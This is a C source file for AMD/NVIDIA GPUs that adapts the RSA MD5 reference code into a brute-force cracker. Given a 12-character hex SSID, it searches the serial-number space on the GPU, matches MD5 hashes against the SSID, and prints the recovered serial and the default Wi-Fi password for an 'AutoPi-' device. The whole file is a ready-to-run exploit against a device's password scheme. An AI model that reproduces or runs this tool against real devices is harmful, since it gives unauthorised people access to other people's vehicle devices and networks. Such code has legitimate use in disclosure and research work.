/* MD5
Original algorithm by RSA Data Security, Inc
Adapted for NVIDIA CUDA by Matthew McClaskey
 
Copyright (C) 1991-2, RSA Data Security, Inc. Created 1991. All
rights reserved.
 
License to copy and use this software is granted provided that it
is identified as the "RSA Data Security, Inc. MD5 Message-Digest
Algorithm" in all material mentioning or referencing this software
or this function.
 
License is also granted to make and use derivative works provided
that such works are identified as "derived from the RSA Data
Security, Inc. MD5 Message-Digest Algorithm" in all material
mentioning or referencing the derived work.
 
RSA Data Security, Inc. makes no representations concerning either
the merchantability of this software or the suitability of this
software for any particular purpose. It is provided "as is"
without express or implied warranty of any kind.
 
These notices must be retained in any copies of any part of this
documentation and/or software.
*/


#include <hip/hip_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>
 
const unsigned int S11 = 7;
const unsigned int S12 = 12;
const unsigned int S13 = 17;
const unsigned int S14 = 22;
const unsigned int S21 = 5;
const unsigned int S22 = 9;
const unsigned int S23 = 14;
const unsigned int S24 = 20;
const unsigned int S31 = 4;
const unsigned int S32 = 11;
const unsigned int S33 = 16;
const unsigned int S34 = 23;
const unsigned int S41 = 6;
const unsigned int S42 = 10;
const unsigned int S43 = 15;
const unsigned int S44 = 21;

#define TRUE 1
#define FALSE 0

__device__ const unsigned int charLen = 8;
__device__ const unsigned int pwdbitlen = 136; // number of bits in plain text
__device__ const unsigned char hexLookup[] = "0123456789abcdef";
 
/* F, G, H and I are basic MD5 functions */
__device__ inline unsigned int F(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (y)) | ((~x) & (z))); }
__device__ inline unsigned int G(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (z)) | ((y) & (~z))); }
__device__ inline unsigned int H(unsigned int x, unsigned int y, unsigned int z) { return ((x) ^ (y) ^ (z)); }
__device__ inline unsigned int I(unsigned int x, unsigned int y, unsigned int z) { return ((y) ^ ((x) | (~z))); }
 
/* ROTATE_LEFT rotates x left n bits */
#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))
 
/* Rotation is separate from addition to prevent recomputation */
__device__ inline void FF(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + F(b, c, d) + x + ac, s) + b;
}
 
__device__ inline void GG(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + G(b, c, d) + x + ac, s) + b;
}
 
__device__ inline void HH(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + H(b ,c ,d) + x + ac, s) + b;
}
 
__device__ inline void II(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + I(b, c, d) + x + ac, s) + b;
}

__device__ void setSerial(char output[], unsigned int input[]) {
	for (unsigned int i = 0, j = 0; j < 16; j+=4, i++) {
		for (unsigned int k = 0; k < 4; k++) {
			output[j + k] = (unsigned char) ((input[i] >> 8*k) & 0xff);
		}
	}
}

__device__ void setHash(char output[], unsigned int input[]) {
	for (unsigned int i = 0, j = 0; j < 32; j+=8, i++) {
		for (unsigned int k = 0; k < 8; k+=2) {
			output[j + k + 1] = hexLookup[((input[i] >> 4*k+0) & 0xf)];
			output[j + k + 0] = hexLookup[((input[i] >> 4*k+4) & 0xf)];
		}
	}
}
 
__global__ void findMatch(unsigned int* ssid, unsigned int* found, char* serialResult, char* hashResult) {  
	unsigned int a, b, c, d;
	unsigned int serial[5];

	for (int i = 0; i < sizeof(serial)/sizeof(serial[0]); i++) {
		serial[i] = 0;
	}

	/*
		Set up serial number in format: "00000000xyzrsijk" + "\n"
		(md5 uses little endian => "00000000rzyxkjis")
		
		Where chars...:
		x, y & z are taken from the blockId.
		r & s are taken from the threadId.
		i, j & k are produced in the three nested loops underneath.
		
		The serial is stored in a int array:
		serial[0] == '0000'
		serial[1] == '0000'
		serial[2] == 'xyzr'
		serial[3] == 'sijk'
		serial[4] == '00d\n'	// d = 1 bit delimiter used by the md5 algorithm
	*/

	for (int i = 0; i < 4; i++) {
		serial[0] += hexLookup[0] << charLen*i;
	}
	serial[1] = serial[0];
	
	serial[2] += hexLookup[(blockIdx.x & 0xf00) >> 8] << charLen*3;		// serial[2] = 'x   '
	serial[2] += hexLookup[(blockIdx.x & 0x0f0) >> 4] << charLen*2;		// serial[2] = 'xy  '
	serial[2] += hexLookup[(blockIdx.x & 0x00f)]      << charLen*1;		// serial[2] = 'xyz '
	serial[2] += hexLookup[(threadIdx.x & 0xf0) >> 4] << charLen*0;		// serial[2] = 'xyzr'

	serial[3] += hexLookup[(threadIdx.x & 0x0f)]      << charLen*3;		// serial[3] = 't   '

	serial[4] += 10  << charLen*0;    					// serial[4] = '   \n'
	serial[4] += 128 << charLen*1;    					// serial[4] = '  d\n'

	// ASCII 0(48) -> 9(57) & a(97) -> f(102)               
	for (unsigned int i = 48; i <= 102; i++) {
		serial[3] &= ~(0xff << charLen*2);           // erase last loops value    
		serial[3] += (i << charLen*2);               // serial[3] = 'ti  '

		for (unsigned int j = 48; j <= 102; j++) {
			serial[3] &= ~(0xff << charLen*1);       // erase last loops value   
			serial[3] += (j << charLen*1);           // serial[3] = 'tij '

			for (unsigned int k = 48; k <= 102; k++) {
				serial[3] &= ~(0xff << charLen*0);   // erase last loops value   
				serial[3] += (k << charLen*0);       // serial[3] = 'tijk'

				//load magic numbers
				a = 0x67452301;
				b = 0xefcdab89;
				c = 0x98badcfe;
				d = 0x10325476;

				// Round 1
				FF ( a, b, c, d, serial[0], S11, 0xd76aa478); // 1
				FF ( d, a, b, c, serial[1], S12, 0xe8c7b756); // 2
				FF ( c, d, a, b, serial[2], S13,  0x242070db); // 3
				FF ( b, c, d, a, serial[3], S14, 0xc1bdceee); // 4
				FF ( a, b, c, d, serial[4], S11, 0xf57c0faf); // 5
				FF ( d, a, b, c, 0, S12, 0x4787c62a); // 6
				FF ( c, d, a, b, 0, S13, 0xa8304613); // 7
				FF ( b, c, d, a, 0, S14, 0xfd469501); // 8
				FF ( a, b, c, d, 0, S11, 0x698098d8); // 9
				FF ( d, a, b, c, 0, S12, 0x8b44f7af); // 10
				FF ( c, d, a, b, 0, S13, 0xffff5bb1); // 11
				FF ( b, c, d, a, 0, S14, 0x895cd7be); // 12
				FF ( a, b, c, d, 0, S11, 0x6b901122); // 13
				FF ( d, a, b, c, 0, S12, 0xfd987193); // 14
				FF ( c, d, a, b, pwdbitlen, S13, 0xa679438e); // 15
				FF ( b, c, d, a, 0, S14, 0x49b40821); // 

				// Round 2
				GG (a, b, c, d, serial[1], S21, 0xf61e2562); // 17
				GG (d, a, b, c, 0, S22, 0xc040b340); // 18
				GG (c, d, a, b, 0, S23, 0x265e5a51); // 19
				GG (b, c, d, a, serial[0], S24, 0xe9b6c7aa); // 20
				GG (a, b, c, d, 0, S21, 0xd62f105d); // 21
				GG (d, a, b, c, 0, S22,  0x2441453); // 22
				GG (c, d, a, b, 0, S23, 0xd8a1e681); // 23
				GG (b, c, d, a, serial[4], S24, 0xe7d3fbc8); // 24
				GG (a, b, c, d, 0, S21, 0x21e1cde6); // 25
				GG (d, a, b, c, pwdbitlen, S22, 0xc33707d6); // 26
				GG (c, d, a, b, serial[3], S23, 0xf4d50d87); // 27
				GG (b, c, d, a, 0, S24, 0x455a14ed); // 28
				GG (a, b, c, d, 0, S21, 0xa9e3e905); // 29
				GG (d, a, b, c, serial[2], S22, 0xfcefa3f8); // 30
				GG (c, d, a, b, 0, S23, 0x676f02d9); // 31
				GG (b, c, d, a, 0, S24, 0x8d2a4c8a); // 32

				// Round 3
				HH (a, b, c, d, 0, S31, 0xfffa3942); // 33
				HH (d, a, b, c, 0, S32, 0x8771f681); // 34
				HH (c, d, a, b, 0, S33, 0x6d9d6122); // 35
				HH (b, c, d, a, pwdbitlen, S34, 0xfde5380c); // 36
				HH (a, b, c, d, serial[1], S31, 0xa4beea44); // 37
				HH (d, a, b, c, serial[4], S32, 0x4bdecfa9); // 38
				HH (c, d, a, b, 0, S33, 0xf6bb4b60); // 39
				HH (b, c, d, a, 0, S34, 0xbebfbc70); // 40
				HH (a, b, c, d, 0, S31, 0x289b7ec6); // 41
				HH (d, a, b, c, serial[0], S32, 0xeaa127fa); // 42
				HH (c, d, a, b, serial[3], S33, 0xd4ef3085); // 43
				HH (b, c, d, a, 0, S34,  0x4881d05); // 44
				HH (a, b, c, d, 0, S31, 0xd9d4d039); // 45
				HH (d, a, b, c, 0, S32, 0xe6db99e5); // 46
				HH (c, d, a, b, 0, S33, 0x1fa27cf8); // 47
				HH (b, c, d, a, serial[2], S34, 0xc4ac5665); // 48

				// Round 4
				II (a, b, c, d, serial[0], S41, 0xf4292244); // 49
				II (d, a, b, c, 0, S42, 0x432aff97); // 50
				II (c, d, a, b, pwdbitlen, S43, 0xab9423a7); // 51
				II (b, c, d, a, 0, S44, 0xfc93a039); // 52
				II (a, b, c, d, 0, S41, 0x655b59c3); // 53
				II (d, a, b, c, serial[3], S42, 0x8f0ccc92); // 54
				II (c, d, a, b, 0, S43, 0xffeff47d); // 55
				II (b, c, d, a, serial[1], S44, 0x85845dd1); // 56
				II (a, b, c, d, 0, S41, 0x6fa87e4f); // 57
				II (d, a, b, c, 0, S42, 0xfe2ce6e0); // 58
				II (c, d, a, b, 0, S43, 0xa3014314); // 59
				II (b, c, d, a, 0, S44, 0x4e0811a1); // 60
				II (a, b, c, d, serial[4], S41, 0xf7537e82); // 61
				II (d, a, b, c, 0, S42, 0xbd3af235); // 62
				II (c, d, a, b, serial[2], S43, 0x2ad7d2bb); // 63
				II (b, c, d, a, 0, S44, 0xeb86d391); // 64

				a += 0x67452301;
				b += 0xefcdab89;
				c += 0x98badcfe;
				d += 0x10325476;

				if (((c >> charLen*2) & 0xffff) == ((ssid[0] >> charLen*2) & 0xffff) && d == ssid[1]) {
					unsigned int hash[] = {a, b, c, d};

					*found = TRUE;
					setSerial(serialResult, serial);
					setHash(hashResult, hash);
					
					return;
				}

				if (k == 57)
					k = 96; // values will be incremented to 97 at the end of their loops
			}
			if (j == 57)
				j = 96;
		}
		if (i == 57)
			i = 96;
	}
}

void usage(char *argv[]) {
	printf("%-7s %s %s\n", "Usage:", argv[0], "<12 hex SSID>");
	exit(0);
}

// Converts the 12 hex char ssid input to arrays of integers in
// little endian which is used by the md5 algorithm.
void ssidToInts(unsigned int result[], char input[]) {
	// Pad with zeros to align with multiple of 8.
	// Will be masked away when doing compares.
	char ssid[17];
	snprintf(ssid, sizeof(ssid)/sizeof(ssid[0]), "%s%s", "0000", input);

	char tmpResult[9];
	tmpResult[8] = 0;
	for (int i = 0; i < 16; i+=8) {
		for (int j = 0; j < 8; j+=2) {
			tmpResult[(j + 1) % 8] = ssid[i + (8 - 1 - j - 0)];
			tmpResult[(j + 0) % 8] = ssid[i + (8 - 1 - j - 1)];
		}
		
		result[(i + 1) / 8] = strtoul(tmpResult, NULL, 16);
	}
}

int main(int argc, char *argv[]) {
	if (argc != 2 || strlen(argv[1]) != 12) {
		usage(argv);
	}
	
	// declare
	unsigned int *found, *ssid;
	char *serialResult, *hashResult;
	const int SERIAL_LENGTH = 16 + 1, HASH_LENGTH = 32 + 1;

	// malloc
	hipMallocManaged((void**)&found, sizeof(int));
	hipMallocManaged((void**)&ssid, 2 * sizeof(int));
	hipMallocManaged((void**)&serialResult, SERIAL_LENGTH * sizeof(char));
	hipMallocManaged((void**)&hashResult, HASH_LENGTH * sizeof(char));
	
	// init
	*found = FALSE;
	ssidToInts(ssid, argv[1]);
	serialResult[SERIAL_LENGTH - 1] = 0;
	hashResult[HASH_LENGTH - 1] = 0;

	findMatch<<<4096, 256>>>(ssid, found, serialResult, hashResult);
	hipDeviceSynchronize();
	
	if (*found) {
		char password[13];
		strncpy(password, hashResult, 12);
		password[12] = 0;

		printf("%-10s %s\n", "Serial:", serialResult);
		printf("%-10s %s\n", "Hash:", hashResult);
		printf("%-10s AutoPi-%s\n", "SSID:", argv[1]);
		printf("%-10s %s\n", "Password:", password);
	} else {
		printf("No match found for SSID %s\n", argv[1]);
	}

	hipFree(found);
	hipFree(ssid);
	hipFree(serialResult);
	hipFree(hashResult);

	return 0;
}
